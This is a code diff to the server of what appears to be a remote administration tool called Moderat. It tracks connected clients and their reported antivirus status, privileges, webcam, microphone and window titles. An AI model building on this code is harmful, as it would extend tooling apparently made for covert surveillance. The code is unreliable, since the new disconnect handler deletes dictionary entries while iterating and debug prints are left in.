@@ -45,7 +45,12 @@ class ModeratServerProtocol(Protocol):
 
     def connectionLost(self, reason):
         global clients
-        clients = {key: value for key, value in clients.items() if value is not self}
+
+        # Delete Socket Entry
+        for key, value in clients.items():
+            if value['socket'] == self:
+                del clients[key]
+
 
     def dataReceived(self, data):
         # Data Received
@@ -62,8 +67,11 @@ class ModeratServerProtocol(Protocol):
         # Clients Initializing
         if mode == 'clientInitializing':
 
+            log.info('Get Key If Exists Or Generate New One')
+
             # If client has no key generate new one and send
             if payload == 'noKey':
+                log.info('Generate New Key')
                 client_id = id_generator()
 
                 self.send_message_to_client(self, client_id, 'clientInitializing')
@@ -72,10 +80,11 @@ class ModeratServerProtocol(Protocol):
             else:
                 client_id = payload
 
-            # Add To Online Clients Dict
             clients[client_id] = {
-                'sock': self,
+                'socket': self,
+                'status': False,
             }
+
             log.info('[*] New Client from %s' % self.transport.getHost())
 
             # Create Client DB Entry
@@ -84,21 +93,19 @@ class ModeratServerProtocol(Protocol):
 
         # Clients Status Checker
         elif mode == 'infoChecker':
-            if clients.has_key(payload['key']):
-                clients[payload['key']] = {
-                    'ip_address':           self.transport.getHost().host,
-                    'os_type':              payload['os_type'],
-                    'os':                   payload['os'],
-                    'protection':           payload['protection'],
-                    'user':                 payload['user'],
-                    'privileges':           payload['privileges'],
-                    'audio_device':         payload['audio_device'],
-                    'webcamera_device':     payload['webcamera_device'],
-                    'window_title':         payload['window_title'],
-                    'key':                  payload['key'],
-                }
-            else:
-                pass
+            clients[payload['key']] = {
+                'ip_address':           self.transport.getHost().host,
+                'os_type':              payload['os_type'],
+                'os':                   payload['os'],
+                'protection':           payload['protection'],
+                'user':                 payload['user'],
+                'privileges':           payload['privileges'],
+                'audio_device':         payload['audio_device'],
+                'webcamera_device':     payload['webcamera_device'],
+                'window_title':         payload['window_title'],
+                'key':                  payload['key'],
+                'socket':               self,
+            }
 
     def moderator_commands(self, data):
 
@@ -135,6 +142,9 @@ class ModeratServerProtocol(Protocol):
             # for online clients
             for client_id in clients_ids:
                 _id = client_id[0]
+                print _id
+                print clients
+                print clients.has_key(_id)
                 # Online Clients
                 if clients.has_key(_id):
                     shared_clients[_id] = {
